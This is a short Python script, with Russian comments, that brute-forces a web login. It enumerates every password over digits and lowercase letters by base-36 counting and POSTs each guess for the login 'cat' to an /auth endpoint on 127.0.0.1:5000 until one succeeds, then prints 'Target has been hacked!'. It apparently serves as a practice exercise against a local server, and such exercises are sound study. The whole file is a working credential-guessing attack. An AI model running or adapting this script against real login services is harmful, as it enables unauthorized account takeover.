import requests


# представим, что alphabet это число в системе исчисления с основанием равным длинне alphabet
alphabet = '0123456789abcdefghijklmnopqrstuvwxyz'
base = len(alphabet)

# тогда в цикле будем переводить каждое следующее число из десятичной си в си с основанием base
# temp - временная переменная, чтобы сохранить текущее значение числа number
# внутренний цикл работает, пока число, которое поллучается при целочисленном делении не превращается в 0
# rest - остаток от деления, который нужно вставить в начало для получения числа в си с основанием base
# так как rest - число в десятичной си, берем вместо него символ, который ему соответствует в alphabet
# password - хранилка, которая содержит текущее полученное число в си с основанием base
# length - длинна текущего перебираемого пароля, чтобы подставить ведущие нули, если длина password < length
# можно вывести номер текущей попытки и password
number = 0
length = 0
login = 'cat'
net_protocol = 'http'
net_node = '127.0.0.1'
net_port = '5000'
net_path = 'auth'
net_query = '???'
net_address = 'http://127.0.0.1:5000/auth'
while True:
    temp = number
    password = ''
    while temp != 0:
        rest = temp % base
        temp = temp // base
        password = alphabet[rest] + password
    # while len(password) < length:
    #     password = '0' + password
    password = alphabet[0] * (length - len(password)) + password
    print(f'Attempt №: {number}   Current length: {length}   Current password: {password}')
    response = requests.post(f'{net_protocol}://{net_node}:{net_port}/{net_path}', json={'login': login, 'password': password})
    if response.status_code == 200:
        print()
        print('Success! Target has been hacked!')
        print(f'Target login: {login}   Target password: {password}')
        break
    else:
        print(f'Status code: {response.status_code}')
    # здесь берется последний символ из alphabet
    if alphabet[-1] * length == password:
        length += 1
        number = 0
    else:
        number += 1
